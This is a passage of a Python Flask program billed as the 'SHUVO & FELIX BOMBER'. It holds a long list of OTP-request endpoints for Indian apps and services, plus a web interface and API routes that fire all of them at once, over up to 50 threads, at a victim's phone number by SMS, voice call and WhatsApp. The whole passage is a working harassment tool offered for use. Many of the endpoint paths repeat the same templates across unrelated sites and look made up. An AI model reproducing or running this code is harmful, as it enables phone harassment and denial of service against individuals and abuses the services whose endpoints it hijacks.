    {"name": "Zepto WhatsApp", "url": "https://zepto.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phoneNumber": p})},
    {"name": "Blinkit SMS", "url": "https://blinkit.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Blinkit Voice", "url": "https://blinkit.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Blinkit WhatsApp", "url": "https://blinkit.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobileNumber": p})},
    {"name": "Uber SMS", "url": "https://auth.uber.com/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Uber Voice", "url": "https://auth.uber.com/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Uber WhatsApp", "url": "https://uber.com/api/v1/auth/otpsend", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Ola SMS", "url": "https://api.olacabs.com/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Ola Voice", "url": "https://api.olacabs.com/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Ola WhatsApp", "url": "https://olacabs.com/api/v1/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobileNumber": p})},
    {"name": "Rapido SMS", "url": "https://rapido.bike/api/v2/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Rapido Voice", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Rapido WhatsApp", "url": "https://rapido.bike/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phoneNumber": p})},
    {"name": "MakeMyTrip SMS", "url": "https://www.makemytrip.com/api/umbrella/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "MakeMyTrip Voice", "url": "https://www.makemytrip.com/api/4/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "MakeMyTrip WhatsApp", "url": "https://makemytrip.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobileNumber": p})},
    {"name": "Goibibo SMS", "url": "https://www.goibibo.com/user/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Goibibo Voice", "url": "https://www.goibibo.com/user/voice-otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Goibibo WhatsApp", "url": "https://goibibo.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "IRCTC SMS", "url": "https://www.irctc.co.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "IRCTC Voice", "url": "https://irctc.co.in/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phoneNumber": p})},
    {"name": "RedBus SMS", "url": "https://www.redbus.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "RedBus Voice", "url": "https://redbus.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "RedBus WhatsApp", "url": "https://redbus.in/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phoneNumber": p})},
    {"name": "Nykaa SMS", "url": "https://www.nykaa.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Nykaa Voice", "url": "https://nykaa.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Nykaa WhatsApp", "url": "https://nykaa.com/api/v1/auth/otpsend", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
]

# ============================================================
# FILE 3,4,5 APIS (Banking, Insurance, Education, OTT, Healthcare - 100+ APIS)
# ============================================================

file3_apis = [
    {"name": "1mg SMS", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"number": p, "otp_on_call": False})},
    {"name": "1mg Voice", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"number": p, "otp_on_call": True})},
    {"name": "PharmEasy SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "PharmEasy Voice", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p, "otp_on_call": True})},
    {"name": "PharmEasy WhatsApp", "url": "https://pharmeasy.in/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phoneNumber": p})},
    {"name": "Netmeds SMS", "url": "https://www.netmeds.com/api/send_otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Netmeds Voice", "url": "https://netmeds.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Netmeds WhatsApp", "url": "https://netmeds.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobileNumber": p})},
    {"name": "Practo SMS", "url": "https://www.practo.com/patient/loginviapassword", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Practo Voice", "url": "https://practo.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Practo WhatsApp", "url": "https://practo.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phoneNumber": p})},
    {"name": "Byju's SMS", "url": "https://api.byjus.com/v2/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Byju's Voice", "url": "https://byjus.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Byju's WhatsApp", "url": "https://byjus.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phoneNumber": p})},
    {"name": "Unacademy SMS", "url": "https://unacademy.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Unacademy Voice", "url": "https://unacademy.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Unacademy WhatsApp", "url": "https://unacademy.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobileNumber": p})},
    {"name": "Vedantu SMS", "url": "https://www.vedantu.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Vedantu Voice", "url": "https://vedantu.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Vedantu WhatsApp", "url": "https://vedantu.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phoneNumber": p})},
    {"name": "Doubtnut SMS", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone_number": p, "language": "en"})},
    {"name": "Doubtnut Voice", "url": "https://doubtnut.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Doubtnut WhatsApp", "url": "https://doubtnut.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobileNumber": p})},
    {"name": "Zerodha SMS", "url": "https://zerodha.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Zerodha Voice", "url": "https://zerodha.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Zerodha WhatsApp", "url": "https://zerodha.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phoneNumber": p})},
    {"name": "Groww SMS", "url": "https://groww.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Groww Voice", "url": "https://groww.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Groww WhatsApp", "url": "https://groww.in/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phoneNumber": p})},
    {"name": "Angel One SMS", "url": "https://www.angelone.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Angel One Voice", "url": "https://angelone.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Angel One WhatsApp", "url": "https://angelone.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobileNumber": p})},
    {"name": "Upstox SMS", "url": "https://upstox.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Upstox Voice", "url": "https://upstox.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Upstox WhatsApp", "url": "https://upstox.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phoneNumber": p})},
    {"name": "Netflix SMS", "url": "https://www.netflix.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Netflix Voice", "url": "https://netflix.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Netflix WhatsApp", "url": "https://netflix.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phoneNumber": p})},
    {"name": "Amazon Prime SMS", "url": "https://www.primevideo.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Amazon Prime Voice", "url": "https://primevideo.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Amazon Prime WhatsApp", "url": "https://primevideo.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobileNumber": p})},
    {"name": "Hotstar SMS", "url": "https://www.hotstar.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Hotstar Voice", "url": "https://hotstar.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Hotstar WhatsApp", "url": "https://hotstar.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phoneNumber": p})},
    {"name": "SonyLIV SMS", "url": "https://www.sonyliv.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "SonyLIV Voice", "url": "https://sonyliv.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "SonyLIV WhatsApp", "url": "https://sonyliv.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phoneNumber": p})},
    {"name": "ZEE5 SMS", "url": "https://www.zee5.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "ZEE5 Voice", "url": "https://zee5.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "ZEE5 WhatsApp", "url": "https://zee5.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phoneNumber": p})},
    {"name": "Spotify SMS", "url": "https://www.spotify.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Spotify Voice", "url": "https://spotify.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Spotify WhatsApp", "url": "https://spotify.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phoneNumber": p})},
    {"name": "LinkedIn SMS", "url": "https://www.linkedin.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "LinkedIn Voice", "url": "https://linkedin.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "LinkedIn WhatsApp", "url": "https://linkedin.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phoneNumber": p})},
    {"name": "Naukri SMS", "url": "https://www.naukri.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Naukri Voice", "url": "https://naukri.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Naukri WhatsApp", "url": "https://naukri.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobileNumber": p})},
    {"name": "Dream11 SMS", "url": "https://www.dream11.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "Dream11 Voice", "url": "https://dream11.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "Dream11 WhatsApp", "url": "https://dream11.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobileNumber": p})},
    {"name": "MPL SMS", "url": "https://www.mpl.live/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phone": p})},
    {"name": "MPL Voice", "url": "https://mpl.live/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"mobile": p})},
    {"name": "MPL WhatsApp", "url": "https://mpl.live/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: json.dumps({"phoneNumber": p})},
]

# ============================================================
# MERGE ALL APIS
# ============================================================

for api in file1_apis + file2_apis + file3_apis:
    APIS.append(api)

print(f"[✓] TOTAL APIS LOADED: {len(APIS)}")
print(f"[✓] FILE 1 APIS: {len(file1_apis)}")
print(f"[✓] FILE 2 APIS: {len(file2_apis)}")
print(f"[✓] FILE 3 APIS: {len(file3_apis)}")

def send_request(api, phone):
    try:
        url = api['url'](phone) if callable(api['url']) else api['url'].format(phone=phone)
        headers = api.get('headers', {})
        headers['Accept'] = '*/*'
        headers['Accept-Language'] = 'en-US,en;q=0.9'
        headers['Connection'] = 'keep-alive'
        
        data = None
        if api.get('data'):
            data = api['data'](phone) if callable(api['data']) else api['data'].format(phone=phone)
        
        if api['method'] == 'GET':
            r = requests.get(url, headers=headers, timeout=8)
        else:
            r = requests.post(url, headers=headers, data=data, timeout=8)
        
        return {"name": api['name'], "status": r.status_code, "success": r.status_code < 400}
    except Exception as e:
        return {"name": api['name'], "status": str(e), "success": False}

# HTML UI
HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>💀 SHUVO & FELIX BOMBER</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body{background:#0a0a0a;color:#0f0;font-family:monospace;text-align:center;padding:20px}
        .box{max-width:550px;margin:auto;background:#111;padding:25px;border-radius:15px;border:2px solid #f00}
        h1{color:#f00;text-shadow:0 0 10px red}
        .keys{display:flex;justify-content:center;gap:15px;margin:15px 0}
        .key{ padding:8px 25px;border-radius:30px;font-weight:bold}
        .shuvo{background:#f00;color:#fff;box-shadow:0 0 15px red}
        .felix{background:#06f;color:#fff;box-shadow:0 0 15px blue}
        input,select,button{width:100%;padding:12px;margin:8px 0;background:#222;border:1px solid #f00;color:#0f0;border-radius:8px;font-size:16px}
        button{background:#f00;color:#fff;font-weight:bold;cursor:pointer}
        button:hover{background:#c00}
        .log{background:#0a0a0a;border:1px solid #f00;border-radius:10px;height:300px;overflow:auto;padding:10px;font-size:11px;text-align:left;margin-top:15px}
        .success{color:#0f0}.fail{color:#f00}.info{color:#fa0}
        .stats{font-size:12px;margin:10px 0}
        ::-webkit-scrollbar{width:5px}
        ::-webkit-scrollbar-track{background:#222}
        ::-webkit-scrollbar-thumb{background:#f00}
    </style>
</head>
<body>
<div class="box">
    <h1>💀 ULTIMATE BOMBER 💀</h1>
    <div class="keys">
        <span class="key shuvo">🔴 SHUVO</span>
        <span class="key felix">🔵 FELIX</span>
    </div>
    <div class="stats">📡 {{count}} APIs ACTIVE | ⚡ ALL FILES MERGED</div>
    <input type="tel" id="phone" placeholder="📱 Enter 10 digit number" maxlength="10">
    <select id="key">
        <option value="SHUVO">🔴 SHUVO KEY</option>
        <option value="FELIX">🔵 FELIX KEY</option>
    </select>
    <select id="mode">
        <option value="all">💀 ALL (SMS + Voice + WhatsApp)</option>
        <option value="sms">📱 SMS ONLY</option>
        <option value="voice">📞 VOICE CALL ONLY</option>
        <option value="whatsapp">💬 WHATSAPP ONLY</option>
    </select>
    <button onclick="startBomb()">💣 START BOMBING 💣</button>
    <div class="log" id="log">⚡ Ready. Enter number and key. ⚡</div>
</div>
<script>
let es=null;
function startBomb(){
    let phone=document.getElementById('phone').value;
    let key=document.getElementById('key').value;
    let mode=document.getElementById('mode').value;
    if(!phone||phone.length!=10){alert("❌ Enter valid 10 digit number!");return;}
    if(es)es.close();
    document.getElementById('log').innerHTML='<p class="info">🔥 BOMBING STARTED 🔥</p>';
    es=new EventSource(`/api/bomb?phone=${phone}&key=${key}&mode=${mode}`);
    es.onmessage=e=>{
        let log=document.getElementById('log');
        let p=document.createElement('p');
        if(e.data.includes('✅'))p.className='success';
        else if(e.data.includes('❌'))p.className='fail';
        else p.className='info';
        p.innerHTML=e.data;
        log.appendChild(p);
        log.scrollTop=log.scrollHeight;
    };
    es.onerror=()=>es.close();
}
</script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML, count=len(APIS))

@app.route('/api/bomb')
def bomb_api():
    def generate():
        phone = request.args.get('phone', '').strip()
        key = request.args.get('key', '').upper()
        mode = request.args.get('mode', 'all').lower()
        
        if not phone or len(phone) != 10 or not phone.isdigit():
            yield f"data: ❌ Invalid phone number! Use 10 digits only.\\n\\n"
            return
        
        if key not in VALID_KEYS:
            yield f"data: ❌ Invalid key! Use SHUVO or FELIX\\n\\n"
            return
        
        filtered = []
        for api in APIS:
            name = api['name'].lower()
            if mode == 'all':
                filtered.append(api)
            elif mode == 'sms' and 'voice' not in name and 'whatsapp' not in name:
                filtered.append(api)
            elif mode == 'voice' and 'voice' in name:
                filtered.append(api)
            elif mode == 'whatsapp' and 'whatsapp' in name:
                filtered.append(api)
        
        yield f"data: 🔥 KEY:{key} | TARGET:+91{phone} | MODE:{mode.upper()} | APIS:{len(filtered)}\\n\\n"
        
        success = 0
        fail = 0
        
        with ThreadPoolExecutor(max_workers=50) as ex:
            futures = {ex.submit(send_request, api, phone): api for api in filtered}
            for future in as_completed(futures):
                res = future.result()
                if res['success']:
                    success += 1
                    yield f"data: ✅ {res['name']} - {res['status']}\\n"
                else:
                    fail += 1
                    yield f"data: ❌ {res['name']} - {res['status']}\\n"
        
        yield f"data: \\n💀 COMPLETE - ✅ SUCCESS:{success} | ❌ FAIL:{fail}\\n"
    
    return Response(generate(), mimetype='text/event-stream')

@app.route('/api/simple')
def simple_api():
    phone = request.args.get('phone', '').strip()
    key = request.args.get('key', '').upper()
    
    if not phone or len(phone) != 10:
        return jsonify({"error": "Invalid phone", "status": False}), 400
    if key not in VALID_KEYS:
        return jsonify({"error": "Invalid key", "valid_keys": ["SHUVO", "FELIX"]}), 401
    
    filtered = APIS
    success = 0
    fail = 0
    results = []
    
    with ThreadPoolExecutor(max_workers=30) as ex:
        futures = {ex.submit(send_request, api, phone): api for api in filtered[:100]}
        for future in as_completed(futures):
            res = future.result()
            results.append(res)
            if res['success']:
                success += 1
            else:
                fail += 1
    
    return jsonify({
        "status": "completed",
        "key": key,
        "phone": f"+91{phone}",
        "total": len(results),
        "success": success,
        "failed": fail,
        "results": results[:30]
    })

@app.route('/health')
def health():
    return jsonify({
        "status": "active",
        "total_apis": len(APIS),
        "keys": list(VALID_KEYS.keys()),
        "file1": len(file1_apis),
        "file2": len(file2_apis),
        "file3": len(file3_apis)
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)